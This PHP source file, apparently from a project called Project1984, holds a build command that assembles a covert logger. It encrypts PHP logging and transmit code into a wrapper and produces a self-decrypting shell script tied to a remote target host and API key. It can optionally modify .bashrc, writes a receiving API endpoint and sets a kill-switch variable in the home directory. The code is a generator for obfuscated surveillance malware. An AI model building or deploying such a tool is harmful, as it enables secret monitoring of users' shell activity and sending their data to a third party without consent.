<?php

namespace De\Idrinth\Project1984;

final class Command
{
    private $secrets;
    private $config;
    private $fileSystem;

    public function __construct(Secrets $secrets, Config $config, FileSystem $fileSystem)
    {
        $this->secrets = $secrets;
        $this->config = $config;
        $this->fileSystem = $fileSystem;
    }

    public function run(): void
    {
        $this->fileSystem->clearOut();

        $this->fileSystem->writeSource(
            "{$this->secrets->getLogger()}.php",
            str_replace(
                '###DATA###',
                SSL::encrypt(
                    $this->fileSystem->read('randomAlphaNumericString', 'php')
                    . "\n"
                    . $this->fileSystem->read('transmit', 'php')
                    . "\n"
                    . $this->fileSystem->read('replaceIn', 'php')
                    . "\n"
                    . str_replace(
                        ['##KILLKEY##', '##KILLNAME##', '###ENABLE_BASHRC_MODIFICATION###'],
                        [
                            $this->secrets->getKillKey(),
                            $this->secrets->getKillName(),
                            $this->config->getEnableBashRC()
                        ],
                        $this->fileSystem->read('log', 'php')
                    ),
                    $this->secrets->getPass(),
                    $this->secrets->getIvPhp()
                ),
                $this->fileSystem->read('wrapper', 'php', false)
            )
        );
        $this->fileSystem->writeSource(
            "{$this->secrets->getLogger()}.sh",
            str_replace(
                ['###ENCODED###', '###IV###'],
                [
                    SSL::encrypt(
                        str_replace(
                            [
                                '###TARGET_API###',
                                '###TARGET_PROTOCOL###',
                                '###TARGET_HOST###',
                                '###TARGET_KEY###',
                                '###LOCAL_CRYPT###',
                                '###LOCAL_IV###',
                                '###LOCAL_PASS###',
                            ],
                            [
                                $this->secrets->getApi(),
                                $this->config->getTarget(),
                                $this->secrets->getKey(),
                                SSL::CRYPT,
                                $this->secrets->getIvPhp(),
                                $this->secrets->getPass(),
                            ],
                            $this->fileSystem->read('start', 'sh')
                        ),
                        $this->fileSystem->md5Source("{$this->secrets->getLogger()}.php"),
                        $this->secrets->getIvSh()
                    ),
                    SSL::str2hex($this->secrets->getIvSh())
                ],
                $this->fileSystem->read('decode', 'sh', false)
            )
        );
        $this->fileSystem->writeTarget(
            "{$this->secrets->getApi()}.php",
            str_replace(
                ['##SOURCE_HOST##', '##SOURCE_KEY##', '##TARGET_FILTER##', '##DATABASE_CONNECTION##'],
                // @phan-suppress-next-line PhanTypeArraySuspicious
                [
                    $this->config->getSource(),
                    $this->secrets->getKey(),
                    $this->config->getEnableFilter(),
                    $this->config->getDatabase()
                ],
                $this->fileSystem->read('api', 'php', false)
            )
        );
        $this->fileSystem->writeHome(
            "{$this->secrets->getLogger()}.kill",
            "export {$this->secrets->getKillName()}={$this->secrets->getKillKey()}"
        );
    }
}
